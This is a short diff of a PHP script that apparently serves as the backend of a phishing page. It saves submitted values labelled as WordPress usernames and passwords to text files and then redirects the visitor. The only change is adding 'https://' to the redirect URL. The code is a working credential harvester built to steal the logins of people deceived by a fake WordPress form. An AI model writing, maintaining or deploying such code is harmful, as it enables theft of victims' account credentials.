@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Wordpress Username : " . $email = $_POST['em
 ?>
 <?php
 file_put_contents("pass.txt", "Wordpress Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
